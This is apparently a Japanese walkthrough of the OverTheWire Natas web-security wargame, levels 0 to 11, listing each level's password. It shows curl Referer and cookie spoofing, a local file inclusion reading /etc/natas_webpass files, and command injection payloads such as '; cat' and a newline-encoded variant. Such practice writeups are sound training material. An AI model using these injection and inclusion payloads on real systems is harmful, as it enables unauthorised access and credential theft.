# Natas - http://overthewire.org/wargames/natas/

Web Securiry!

## Level 0

http://natas0.natas.labs.overthewire.org アクセスするとusername: natas0, password: natas0

## Level 0>1

ソースの中にコメントアウトされたパスワードがある。

gtVrDuiDfck831PqWsLEZy5gyDz1clto
## Level 1>2

１つ前と同じだが、右クリックができないので最初にコンソールを開いた状態でアクセスする。

ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

## Level 2>3

ソースを見ると`file/pixel.png`というファイルがある。画像自体に意味はなかったが、 http://natas2.natas.labs.overthewire.org/files/ にアクセスすると`users.txt` がありその中にnatas3のパスワードがある

## Level 3>4

ソースに`<!-- No more information leaks!! Not even Google will find it this time... -->`とあり`robots.txt`だとあたりがついた。

http://natas3.natas.labs.overthewire.org/robots.txt にいくと、/s3cr3t/とあるので http://natas3.natas.labs.overthewire.org/s3cr3t/ にusers.txtがある

Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

## Level 4>5

```
Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```
と言われるので natas5から来たように見せかける必要がある。

コンソールからGET index.phpのリクエストをcurl形式でコピーしする。

```
curl 'http://natas4.natas.labs.overthewire.org/index.php' -H 'Pragma: no-cache' -H 'Accept-Encoding: gzip, deflate, sdch' -H 'Accept-Language: ja,en-US;q=0.8,en;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: no-cache' -H 'Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va' -H 'Cookie: __cfduid=d5d2f7fba2a15d7664db136482e3d8d6b1493545265; __utma=176859643.511105113.1493545305.1493574933.1493581635.8; __utmb=176859643.35.10.1493581635; __utmc=176859643; __utmz=176859643.1493545305.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)' -H 'Connection: keep-alive' -H 'Referer: http://natas4.natas.labs.overthewire.org/' --compressed
```

で、Refererをnatas5にすればok

iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

## Level 5>6

リクエストをcurlコピーすると以下である。
```
curl 'http://natas5.natas.labs.overthewire.org/index.php' -H 'Pragma: no-cache' -H 'Accept-Encoding: gzip, deflate, sdch' -H 'Accept-Language: ja,en-US;q=0.8,en;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: no-cache' -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' -H 'Cookie: loggedin=0' -H 'Connection: keep-alive' --compressed
```

`Cokkie: loggedin=0`を1にするだけ。

aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

## Level 6>7

ソース中の
```
<?
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```
から、 http://natas6.natas.labs.overthewire.org/includes/secret.inc にsecretがあるのでこれを提出。

## Level 7 > 8

ヒントにある`/etc/natas_webpass/natas8`をパラメータに入れる。

http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

## 8 > 9

```
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

encodeSecret()の逆をやれば良いので、サンドボックスかどこかで
```
echo base64_decode(strrev(hex2bin($encodedSecret)));
```

とすると、`oubWYf2kBq`が得られ、提出すればok

W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

## 9 > 10

source code から入力した文字列を `passthru("grep -i $key dictionary.txt");`の$keyに代入して実行している。※paththruはコマンド実行関数

セミコロンで無理やりコマンドを止めて、そのあとに任意のコマンドを実行できるので

```
; cat /etc/natas_webpass/natas10
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

## 10 > 11

さっきと似たような問題だが、`;`, `|`, `&`がエスケープされている。これを回避できれば良い。

最初に改行コードLF(0xA)を入れることで回避できる。

https://ja.wikipedia.org/wiki/%E6%94%B9%E8%A1%8C%E3%82%B3%E3%83%BC%E3%83%89


```
%0Acat /etc/natas_webpass/natas11
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

## 11 > 12
